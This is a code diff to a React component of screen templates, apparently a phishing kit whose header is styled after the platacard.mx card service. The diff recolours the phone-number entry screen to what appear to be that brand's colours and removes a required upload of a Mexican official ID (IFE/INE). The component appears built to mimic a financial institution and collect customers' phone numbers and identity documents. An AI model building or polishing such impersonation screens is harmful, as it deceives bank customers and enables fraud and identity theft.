@@ -365,7 +365,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
                 {/* Header estilo platacard.mx */}
                 <div className="text-center mb-8">
-                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <div className="bg-gradient-to-r from-[#BE0046] to-[#9A0037] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                     <span className="text-2xl text-white">📱</span>
                   </div>
                   <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu número celular</h2>
@@ -387,7 +387,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       }
                     }}
                     placeholder="5512345678"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#BE0046] focus:border-[#BE0046] text-lg"
                     maxLength={10}
                   />
                   <p className="text-xs text-gray-500 mt-2">
@@ -395,47 +395,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </p>
                 </div>
 
-                {/* Input de foto */}
-                <div className="mb-6">
-                  <label className="block text-sm font-medium text-gray-700 mb-2">
-                    Sube tu identificación oficial (IFE/INE)
-                  </label>
-                  <div className="border-2 border-dashed border-gray-300 rounded-xl p-6 text-center">
-                    <input
-                      type="file"
-                      accept="image/*"
-                      onChange={(e) => {
-                        const file = e.target.files?.[0];
-                        if (file) {
-                          setPhotoFile(file);
-                        }
-                      }}
-                      className="hidden"
-                      id="photo-upload"
-                    />
-                    <label htmlFor="photo-upload" className="cursor-pointer">
-                      {photoFile ? (
-                        <div className="text-green-600">
-                          <div className="text-2xl mb-2">✅</div>
-                          <p className="text-sm">Foto cargada: {photoFile.name}</p>
-                        </div>
-                      ) : (
-                        <div className="text-gray-500">
-                          <div className="text-2xl mb-2">📷</div>
-                          <p className="text-sm">Toca para subir tu foto</p>
-                        </div>
-                      )}
-                    </label>
-                  </div>
-                  <p className="text-xs text-gray-500 mt-2">
-                    Requerido para verificar tu identidad
-                  </p>
-                </div>
+
 
                 {/* Botón continuar */}
                 <Button
                   onClick={() => onSubmit(ScreenType.PHONE_INPUT, { phone: dataA })}
-                  disabled={!dataA || dataA.length !== 10 || !photoFile}
+                  disabled={!dataA || dataA.length !== 10}
                   className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                 >
                   Continuar
